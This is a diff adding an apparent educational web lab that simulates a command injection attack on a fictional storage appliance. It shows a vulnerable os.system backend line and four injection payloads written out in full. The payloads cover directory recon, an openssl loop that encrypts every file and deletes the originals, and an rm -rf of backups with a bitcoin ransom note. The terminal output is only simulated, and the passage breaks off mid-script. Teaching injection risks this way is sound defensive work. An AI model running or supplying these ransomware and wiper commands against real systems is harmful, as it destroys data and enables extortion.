@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔒 Security Lab: Command Injection Ransomware & Destructive Attacks</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0b0f19;
+    --panel: #111827;
+    --panel-2: #1f2937;
+    --border: #374151;
+    --accent: #f59e0b;
+    --danger: #ef4444;
+    --safe: #10b981;
+    --blue: #3b82f6;
+    --purple: #a855f7;
+    --cyan: #06b6d4;
+    --text: #f9fafb;
+    --text-muted: #9ca3af;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'IBM Plex Sans', system-ui, sans-serif;
+  }
+
+  body {
+    font-family: var(--sans);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+    line-height: 1.6;
+  }
+
+  /* ── Dynamic Cyber Background ── */
+  .cyber-bg {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden;
+  }
+  .cyber-grid {
+    position: absolute; inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+  .cyber-orb {
+    position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.35; will-change: transform;
+  }
+  .orb-1 { width: 600px; height: 600px; background: radial-gradient(circle, #ef4444 0%, rgba(239,68,68,0) 70%); top: -100px; left: -100px; animation: floatOrb1 16s ease-in-out infinite alternate; }
+  .orb-2 { width: 650px; height: 650px; background: radial-gradient(circle, #f59e0b 0%, rgba(245,158,11,0) 70%); bottom: -100px; right: -120px; animation: floatOrb2 20s ease-in-out infinite alternate; }
+  .orb-3 { width: 500px; height: 500px; background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%); top: 35%; right: 20%; animation: floatOrb3 18s ease-in-out infinite alternate; }
+  .orb-4 { width: 550px; height: 550px; background: radial-gradient(circle, #3b82f6 0%, rgba(59,130,246,0) 70%); bottom: 10%; left: 15%; animation: floatOrb4 22s ease-in-out infinite alternate; }
+  @keyframes floatOrb1 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-60px, 140px) scale(0.92); } }
+  @keyframes floatOrb2 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-80px, -70px) scale(0.9); } }
+  @keyframes floatOrb3 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-100px, -50px) scale(1.05); } }
+  @keyframes floatOrb4 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(90px, 70px) scale(0.9); } }
+
+  /* ── Layout ── */
+  .container {
+    max-width: 1380px;
+    margin: 0 auto;
+    padding: 24px 20px 60px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ── Header ── */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
+    padding-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 30px;
+  }
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+    font-size: 13px;
+    text-decoration: none;
+    transition: all 0.2s;
+  }
+  .back-link:hover {
+    color: var(--text);
+    border-color: var(--accent);
+    transform: translateX(-3px);
+  }
+  .header-title h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .header-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 10px;
+    background: rgba(239, 68, 68, 0.15);
+    border: 1px solid rgba(239, 68, 68, 0.35);
+    border-radius: 20px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--danger);
+    font-weight: 600;
+  }
+
+  /* ── Moving Interactive Pipeline Stream (4 Stages matching 4 Presets) ── */
+  .flow-stream-bar {
+    background: rgba(17, 24, 39, 0.7);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 12px 18px;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    overflow: hidden;
+  }
+  .flow-stream-bar::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%; width: 100%; height: 2px;
+    background: linear-gradient(90deg, transparent, var(--danger), #f59e0b, transparent);
+    animation: pipelineLaser 3s linear infinite;
+  }
+  @keyframes pipelineLaser {
+    0% { left: -100%; }
+    100% { left: 100%; }
+  }
+  .flow-step-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: var(--text-muted);
+    transition: all 0.3s;
+    z-index: 1;
+  }
+  .flow-step-item.active {
+    color: #fca5a5;
+    font-weight: 600;
+  }
+  .flow-step-item.attacked {
+    color: var(--danger);
+    font-weight: 700;
+    text-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
+  }
+  .flow-dot-pulse {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: #4b5563;
+    display: inline-block;
+  }
+  .flow-step-item.active .flow-dot-pulse {
+    background: var(--blue);
+    box-shadow: 0 0 8px var(--blue);
+    animation: dotPulse 1s infinite alternate;
+  }
+  .flow-step-item.attacked .flow-dot-pulse {
+    background: var(--danger);
+    box-shadow: 0 0 10px var(--danger);
+    animation: dotPulseRed 0.8s infinite alternate;
+  }
+  @keyframes dotPulse {
+    0% { transform: scale(1); opacity: 0.6; }
+    100% { transform: scale(1.4); opacity: 1; }
+  }
+  @keyframes dotPulseRed {
+    0% { transform: scale(1); opacity: 0.7; box-shadow: 0 0 4px #ef4444; }
+    100% { transform: scale(1.6); opacity: 1; box-shadow: 0 0 12px #ef4444; }
+  }
+  .flow-connector {
+    color: #4b5563;
+    font-size: 13px;
+  }
+
+  /* ── 2-Column Split Layout ── */
+  .lab-split-layout {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+  }
+  @media (max-width: 1024px) {
+    .lab-split-layout { grid-template-columns: 1fr; }
+  }
+
+  /* ── Card Panels ── */
+  .card-panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+  .panel-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding-bottom: 14px;
+    border-bottom: 1px solid var(--border);
+  }
+  .panel-title {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+  }
+
+  /* ── Presets ── */
+  .preset-list {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .preset-btn {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 10px 14px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 12px;
+    cursor: pointer;
+    text-align: left;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .preset-btn:hover {
+    border-color: var(--accent);
+    background: rgba(245, 158, 11, 0.08);
+  }
+  .preset-btn.active {
+    border-color: var(--danger);
+    background: rgba(239, 68, 68, 0.15);
+    color: #fca5a5;
+  }
+  .preset-tag {
+    font-size: 10.5px;
+    padding: 2px 6px;
+    border-radius: 4px;
+    background: rgba(255, 255, 255, 0.06);
+  }
+
+  /* ── Input Box & Code Inspector ── */
+  .form-group {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .form-label {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-muted);
+    display: flex;
+    justify-content: space-between;
+  }
+  .form-input {
+    width: 100%;
+    background: #090d16;
+    border: 1px solid var(--border);
+    color: #38bdf8;
+    font-family: var(--mono);
+    font-size: 13px;
+    padding: 12px 14px;
+    border-radius: 8px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .form-input:focus {
+    border-color: var(--blue);
+  }
+  .cmd-preview {
+    background: #060910;
+    border: 1px solid #1f2937;
+    border-radius: 8px;
+    padding: 12px 14px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: #94a3b8;
+    line-height: 1.5;
+  }
+  .cmd-label {
+    color: #64748b;
+    font-size: 10px;
+    margin-bottom: 4px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .cmd-hl-safe { color: #10b981; }
+  .cmd-hl-injected { color: #f87171; font-weight: 700; text-decoration: underline; }
+
+  /* ── Action Buttons (Execute + Reset) ── */
+  .action-row {
+    display: flex;
+    gap: 12px;
+  }
+  .btn-execute {
+    flex: 1;
+    background: linear-gradient(145deg, #b91c1c, #dc2626);
+    color: #fff;
+    border: 1px solid #ef4444;
+    padding: 13px 18px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    box-shadow: 0 4px 18px rgba(239, 68, 68, 0.35);
+    transition: all 0.2s;
+  }
+  .btn-execute:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(239, 68, 68, 0.5);
+  }
+  .btn-execute:active {
+    transform: translateY(0);
+  }
+
+  .btn-reset {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    padding: 13px 18px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    transition: all 0.2s;
+  }
+  .btn-reset:hover {
+    color: var(--text);
+    border-color: var(--accent);
+    background: rgba(245, 158, 11, 0.1);
+  }
+
+  /* ── Right Panel: Terminal & Files ── */
+  .parser-heartbeat {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: #10b981;
+  }
+  .parser-heartbeat.alarm {
+    color: #ef4444;
+  }
+  .wave-bars {
+    display: inline-flex;
+    align-items: flex-end;
+    gap: 2px;
+    height: 14px;
+  }
+  .wave-bar {
+    width: 3px;
+    background: #10b981;
+    border-radius: 1px;
+    animation: waveBounce 1s ease-in-out infinite alternate;
+  }
+  .parser-heartbeat.alarm .wave-bar {
+    background: #ef4444;
+  }
+  .wave-bar:nth-child(2) { animation-delay: 0.2s; }
+  .wave-bar:nth-child(3) { animation-delay: 0.4s; }
+  .wave-bar:nth-child(4) { animation-delay: 0.6s; }
+  @keyframes waveBounce {
+    0% { height: 3px; }
+    100% { height: 14px; }
+  }
+
+  .terminal-box {
+    background: #050811;
+    border: 1px solid #1f2937;
+    border-radius: 8px;
+    padding: 16px;
+    font-family: var(--mono);
+    font-size: 12px;
+    min-height: 240px;
+    max-height: 320px;
+    overflow-y: auto;
+    color: #94a3b8;
+    white-space: pre-wrap;
+    word-break: break-all;
+    line-height: 1.6;
+    position: relative;
+  }
+  .term-cursor {
+    display: inline-block;
+    width: 7px;
+    height: 13px;
+    background: #10b981;
+    vertical-align: middle;
+    margin-left: 4px;
+    animation: blinkCursor 0.9s step-end infinite;
+  }
+  .terminal-box.alarm .term-cursor {
+    background: #ef4444;
+  }
+  @keyframes blinkCursor {
+    50% { opacity: 0; }
+  }
+
+  /* ── File Explorer Status ── */
+  .files-box {
+    background: #0a0e1a;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+  }
+  .files-header {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-muted);
+    margin-bottom: 10px;
+    display: flex;
+    justify-content: space-between;
+  }
+  .file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 7px 10px;
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-size: 12px;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    transition: all 0.3s;
+  }
+  .file-item:last-child { border-bottom: none; }
+  .file-item.locked {
+    background: rgba(239, 68, 68, 0.1);
+    color: #fca5a5;
+  }
+  .file-status-badge {
+    font-size: 10px;
+    padding: 2px 6px;
+    border-radius: 4px;
+    background: rgba(16, 185, 129, 0.15);
+    color: #10b981;
+  }
+  .file-item.locked .file-status-badge {
+    background: rgba(239, 68, 68, 0.25);
+    color: #ef4444;
+    font-weight: 700;
+  }
+
+  /* ── Live Extortion Modal / Banner ── */
+  .ransom-banner {
+    display: none;
+    background: linear-gradient(145deg, #1e0a0a, #350c0c);
+    border: 2px solid #ef4444;
+    border-radius: 10px;
+    padding: 16px 20px;
+    animation: ransomPulse 2s infinite alternate;
+  }
+  @keyframes ransomPulse {
+    0% { box-shadow: 0 0 15px rgba(239, 68, 68, 0.2); }
+    100% { box-shadow: 0 0 30px rgba(239, 68, 68, 0.5); }
+  }
+  .ransom-title {
+    color: #ff4d4d;
+    font-family: var(--mono);
+    font-size: 14px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 6px;
+  }
+  .ransom-text {
+    font-size: 12px;
+    color: #fecaca;
+    line-height: 1.5;
+  }
+
+  /* ── Standard Modern Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, #1f2937, #111827);
+    padding: 12px 28px; border-radius: 30px; font-family: var(--mono); font-size: 13.5px;
+    color: #9ca3af; border: 1px solid #374151;
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: #ef4444;
+    color: #f9fafb;
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Dynamic Cyber Background -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+</div>
+
+<div class="container">
+
+  <!-- Header -->
+  <header class="header">
+    <div class="header-left">
+      <a href="../guides/CMDI.html" class="back-link">← Back to CMDI Notes</a>
+      <div class="header-title">
+        <h1>🔒 Command Injection Ransomware & Destructive Attacks</h1>
+      </div>
+    </div>
+    <div class="header-badge">
+      <span>● ACTIVE LAB</span>
+    </div>
+  </header>
+
+  <!-- Moving Interactive Pipeline Stream (Synchronized 4 Stages) -->
+  <div class="flow-stream-bar" id="pipeline-stream">
+    <div class="flow-step-item active" id="flow-step-1">
+      <span class="flow-dot-pulse"></span>
+      <span>1. Legitimate Network Diagnostics</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="flow-step-2">
+      <span class="flow-dot-pulse"></span>
+      <span>2. Storage Discovery Recon (;)</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="flow-step-3">
+      <span class="flow-dot-pulse"></span>
+      <span>3. OpenSSL AES-256 Locking Loop</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="flow-step-4">
+      <span class="flow-dot-pulse"></span>
+      <span>4. Wipe Backups & Extortion Note</span>
+    </div>
+  </div>
+
+  <!-- Dual Split Lab Layout -->
+  <div class="lab-split-layout">
+
+    <!-- Left Column: Appliance Diagnostics Interface -->
+    <div class="card-panel">
+      <div class="panel-header">
+        <div class="panel-title">
+          <span>🛠️ ApexVault Appliance v4.2 Console</span>
+        </div>
+        <span style="font-family:var(--mono); font-size:11px; color:#64748b;">Target: /var/data/</span>
+      </div>
+
+      <!-- Quick Preset Selection (4 Presets matching 4 Stages) -->
+      <div class="form-group">
+        <label class="form-label">
+          <span>Attack Payloads & Diagnostics Presets:</span>
+          <span style="color:var(--danger)">Attacker: Om bobde</span>
+        </label>
+        <div class="preset-list">
+          <button type="button" class="preset-btn" onclick="applyPreset(1, this)">
+            <span>1. Legitimate Network Ping Diagnostics</span>
+            <span class="preset-tag">SAFE</span>
+          </button>
+          <button type="button" class="preset-btn" onclick="applyPreset(2, this)">
+            <span>2. Recon: Enumerate Storage Databases</span>
+            <span class="preset-tag" style="color:var(--accent)">RECON</span>
+          </button>
+          <button type="button" class="preset-btn active" onclick="applyPreset(3, this)">
+            <span>3. Execute AES-256 File Locking Loop</span>
+            <span class="preset-tag" style="color:var(--danger)">RANSOMWARE</span>
+          </button>
+          <button type="button" class="preset-btn" onclick="applyPreset(4, this)">
+            <span>4. Wipe Redundant Backups & Extort Admin</span>
+            <span class="preset-tag" style="color:var(--danger)">DESTRUCTIVE</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Input Field -->
+      <div class="form-group">
+        <label class="form-label" for="diag-input">
+          <span>Appliance Target IP / Host Parameter:</span>
+          <span>HTTP POST /api/v2/archive</span>
+        </label>
+        <input type="text" id="diag-input" class="form-input" value="127.0.0.1; for f in /var/data/*; do openssl enc -aes-256-cbc -salt -in &quot;$f&quot; -out &quot;$f.locked&quot; -k &quot;OmBobdeRansomKey2026&quot; -pbkdf2 &amp;&amp; rm -f &quot;$f&quot;; done">
+      </div>
+
+      <!-- Live Command Preview Box -->
+      <div class="cmd-preview">
+        <div class="cmd-label">Backend Evaluated Command (os.system / exec):</div>
+        <div id="cmd-string">ping -c 1 <span class="cmd-hl-injected">127.0.0.1; for f in /var/data/*; do openssl enc -aes-256-cbc -salt -in "$f" -out "$f.locked" -k "OmBobdeRansomKey2026" -pbkdf2 && rm -f "$f"; done</span> && tar -czf /tmp/diag.tar.gz /var/data/</div>
+      </div>
+
+      <!-- Action Row: Execute Button + Reset Button -->
+      <div class="action-row">
+        <button type="button" class="btn-execute" onclick="executeCommand()">
+          <span>💥 Fire Command Injection Payload</span>
+        </button>
+        <button type="button" class="btn-reset" onclick="resetLab()">
+          <span>↺ Reset Lab</span>
+        </button>
+      </div>
+
+      <!-- Vulnerable Code Snippet Drawer -->
+      <div style="background:#090d16; border:1px solid #1f2937; border-radius:8px; padding:12px; font-family:var(--mono); font-size:11px; color:#94a3b8;">
+        <span style="color:#ef4444; font-weight:700;">// VULNERABLE BACKEND (server.py)</span><br>
+        <code>target_ip = request.form['target_ip']</code><br>
+        <code>os.system(f"ping -c 1 {target_ip} && tar -czf /tmp/diag.tar.gz /var/data/")</code><br>
+        <span style="color:#64748b;">// Flaw: Unsanitized shell interpolation allows command chaining with ';'</span>
+      </div>
+    </div>
+
+    <!-- Right Column: Terminal & Storage File Tree -->
+    <div class="card-panel">
+      <div class="panel-header">
+        <div class="panel-title">
+          <span>💻 ApexVault Appliance Terminal Output</span>
+        </div>
+        <div class="parser-heartbeat" id="system-heartbeat">
+          <div class="wave-bars">
+            <span class="wave-bar"></span>
+            <span class="wave-bar"></span>
+            <span class="wave-bar"></span>
+            <span class="wave-bar"></span>
+          </div>
+          <span id="heartbeat-text">STORAGE DAEMON NORMAL</span>
+        </div>
+      </div>
+
+      <!-- Live Extortion Banner (Appears on attack) -->
+      <div class="ransom-banner" id="ransom-box">
+        <div class="ransom-title">
+          <span>🚨 ATTENTION: ENTERPRISE DATA LOCKED BY OM BOBDE</span>
+        </div>
+        <div class="ransom-text">
+          All corporate repositories, blueprints, and audit records belonging to <strong>Irshad Akram</strong>, <strong>Bhavesh Singh</strong>, <strong>Shabaj Ansari</strong>, and <strong>Mohammad Asif</strong> have been encrypted using AES-256-CBC. Decryption key requires <strong>5.5 BTC</strong> transfer.
+        </div>
+      </div>
+
+      <!-- Interactive Output Terminal -->
+      <div class="terminal-box" id="term-output">[root@apexvault-appliance ~]# ping -c 1 127.0.0.1
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.042 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.042/0.042/0.042/0.000 ms
+
+[!] Waiting for command dispatch...<span class="term-cursor"></span></div>
+
+      <!-- Storage File Tree Explorer -->
+      <div class="files-box">
+        <div class="files-header">
+          <span>DIRECTORY: /var/data/</span>
+          <span id="locked-count" style="color:#10b981;">0 / 4 Encrypted</span>
+        </div>
+        <div class="file-item" id="f-1">
+          <span>📁 irshad_akram_master_database.sql</span>
+          <span class="file-status-badge" id="s-1">CLEAN (PLAINTEXT)</span>
+        </div>
+        <div class="file-item" id="f-2">
+          <span>🔑 bhavesh_singh_production_keys.env</span>
+          <span class="file-status-badge" id="s-2">CLEAN (PLAINTEXT)</span>
+        </div>
+        <div class="file-item" id="f-3">
+          <span>📦 shabaj_ansari_backup_snapshots.tar</span>
+          <span class="file-status-badge" id="s-3">CLEAN (PLAINTEXT)</span>
+        </div>
+        <div class="file-item" id="f-4">
+          <span>🛡️ mohammad_asif_compliance_audit.db</span>
+          <span class="file-status-badge" id="s-4">CLEAN (PLAINTEXT)</span>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+
+<!-- Standard Modern Footer -->
+<footer class="modern-footer">
+  <div class="footer-badge">
+    <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+  </div>
+</footer>
+
+<script>
+const presets = {
+  1: {
+    input: "127.0.0.1",
+    attack: false,
+    step: 1,
+    output: `[root@apexvault-appliance ~]# ping -c 1 127.0.0.1 && tar -czf /tmp/diag.tar.gz /var/data/
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+tar: Removing leading '/' from member names
+/var/data/irshad_akram_master_database.sql
+/var/data/bhavesh_singh_production_keys.env
+/var/data/shabaj_ansari_backup_snapshots.tar
+/var/data/mohammad_asif_compliance_audit.db
+
+[+] Diagnostic archive successfully generated at /tmp/diag.tar.gz (4.8 MB)`
+  },
+  2: {
+    input: "127.0.0.1; ls -la /var/data/ /var/backups/",
+    attack: true,
+    step: 2,
+    output: `[root@apexvault-appliance ~]# ping -c 1 127.0.0.1; ls -la /var/data/ /var/backups/
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.039 ms
+
+/var/data/:
+drwxr-xr-x 2 root root      4096 Sep 03 01:00 .
+-rw------- 1 irshad_akram    4892110 Sep 02 22:15 irshad_akram_master_database.sql
+-rw------- 1 bhavesh_singh     31800 Sep 02 18:30 bhavesh_singh_production_keys.env
+-rw------- 1 shabaj_ansari  89201940 Sep 02 14:10 shabaj_ansari_backup_snapshots.tar
+-rw------- 1 mohammad_asif    781920 Sep 02 09:45 mohammad_asif_compliance_audit.db
+
+/var/backups/:
+-rw-r--r-- 1 root root  142091800 Sep 01 04:00 weekly_cold_storage.tar.gz
+-rw-r--r-- 1 root root   98402100 Sep 02 04:00 daily_cloud_replica.img
+
+[!] Attacker Om bobde identified critical storage archives of Irshad Akram and team.`
+  },
+  3: {
+    input: '127.0.0.1; for f in /var/data/*; do openssl enc -aes-256-cbc -salt -in "$f" -out "$f.locked" -k "OmBobdeRansomKey2026" -pbkdf2 && rm -f "$f"; done',
+    attack: true,
+    step: 3,
+    output: `[root@apexvault-appliance ~]# ping -c 1 127.0.0.1; for f in /var/data/*; do openssl enc -aes-256-cbc -salt -in "$f" -out "$f.locked" -k "OmBobdeRansomKey2026" -pbkdf2 && rm -f "$f"; done
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms
+
+[ENCRYPT] Processing: irshad_akram_master_database.sql -> AES-256-CBC [LOCKED]
+[ENCRYPT] Processing: bhavesh_singh_production_keys.env -> AES-256-CBC [LOCKED]
+[ENCRYPT] Processing: shabaj_ansari_backup_snapshots.tar -> AES-256-CBC [LOCKED]
+[ENCRYPT] Processing: mohammad_asif_compliance_audit.db -> AES-256-CBC [LOCKED]
+
+[!] 4 of 4 production datasets encrypted with key OmBobdeRansomKey2026.
+[!] Original files permanently unlinked.`
+  },
+  4: {
+    input: '127.0.0.1; rm -rf /var/backups/* && echo -e "ATTENTION: Irshad Akram & Team Databases have been ENCRYPTED.\\nPay 5.5 BTC to Om bobde wallet to receive key." > /var/data/README_RESTORE_FILES.txt && cat /var/data/README_RESTORE_FILES.txt',
+    attack: true,
+    step: 4,
+    output: `[root@apexvault-appliance ~]# ping -c 1 127.0.0.1; rm -rf /var/backups/* && echo -e "ATTENTION: Irshad Akram & Team Databases have been ENCRYPTED.\\nPay 5.5 BTC to Om bobde wallet to receive key." > /var/data/README_RESTORE_FILES.txt && cat /var/data/README_RESTORE_FILES.txt
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
+
+[WIPE] Purging /var/backups/weekly_cold_storage.tar.gz ... DELETED
+[WIPE] Purging /var/backups/daily_cloud_replica.img ... DELETED
+[EXTORT] Dropping ransom note on /var/data/README_RESTORE_FILES.txt
+
+============================================================
+ATTENTION: Irshad Akram & Team Databases have been ENCRYPTED.
+Pay 5.5 BTC to Om bobde wallet to receive key.
+============================================================`
+  }
+};
+
+function applyPreset(num, btn) {
+  document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+
+  const p = presets[num];
+  document.getElementById('diag-input').value = p.input;
+
+  // Update preview
+  const safePart = 'ping -c 1 ';
+  const endPart = ' && tar -czf /tmp/diag.tar.gz /var/data/';
+  document.getElementById('cmd-string').innerHTML = safePart + '<span class="' + (p.attack ? 'cmd-hl-injected' : 'cmd-hl-safe') + '">' + escapeHtml(p.input) + '</span>' + endPart;
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+function animatePipeline(step) {
+  for (let i = 1; i <= 4; i++) {
+    const el = document.getElementById('flow-step-' + i);
+    el.classList.remove('active', 'attacked');
+    if (i < step) {
+      el.classList.add('attacked');
+    } else if (i === step) {
+      el.classList.add(step > 1 ? 'attacked' : 'active');
+    }
+  }
+}
+
+async function typeTerminal(text) {
+  const term = document.getElementById('term-output');
+  term.textContent = '';
+  const lines = text.split('\n');
+  
+  for (let line of lines) {
+    term.textContent += line + '\n';
+    term.scrollTop = term.scrollHeight;
+    await new Promise(r => setTimeout(r, 45));
+  }
+  const cursor = document.createElement('span');
+  cursor.className = 'term-cursor';
+  term.appendChild(cursor);
+}
+
+async function executeCommand() {
+  const input = document.getElementById('diag-input').value;
+  const heartbeat = document.getElementById('system-heartbeat');
+  const heartbeatText = document.getElementById('heartbeat-text');
+  const term = document.getElementById('term-output');
+  const ransomBox = document.getElementById('ransom-box');
+
+  let matchedPreset = Object.values(presets).find(p => p.input === input);
+  if (!matchedPreset) {
+    matchedPreset = {
+      input: input,
+      attack: input.includes(';') || input.includes('&') || input.includes('|'),
+      step: 3,
+      output: `[root@apexvault-appliance ~]# ${input}\nExecuting custom command payload on appliance...\nCommand finished.`
+    };
+  }
+
+  // Animation Sequence
+  animatePipeline(1);
+  await new Promise(r => setTimeout(r, 200));
+
+  if (matchedPreset.step >= 2) {
+    animatePipeline(2);
+    await new Promise(r => setTimeout(r, 250));
+  }
+  if (matchedPreset.step >= 3) {
+    animatePipeline(3);
+    await new Promise(r => setTimeout(r, 250));
+  }
+  if (matchedPreset.step >= 4) {
+    animatePipeline(4);
+    await new Promise(r => setTimeout(r, 300));
+  }
+
+  if (matchedPreset.attack) {
+    heartbeat.classList.add('alarm');
+    heartbeatText.textContent = '🚨 DISK ENCRYPTION I/O PEAK';
+    term.classList.add('alarm');
+
+    if (matchedPreset.step >= 3) {
+      // Lock files in explorer
+      document.getElementById('f-1').className = 'file-item locked';
+      document.getElementById('s-1').textContent = 'ENCRYPTED (.locked)';
+      document.getElementById('f-2').className = 'file-item locked';
+      document.getElementById('s-2').textContent = 'ENCRYPTED (.locked)';
+      document.getElementById('f-3').className = 'file-item locked';
+      document.getElementById('s-3').textContent = 'ENCRYPTED (.locked)';
+      document.getElementById('f-4').className = 'file-item locked';
+      document.getElementById('s-4').textContent = 'ENCRYPTED (.locked)';
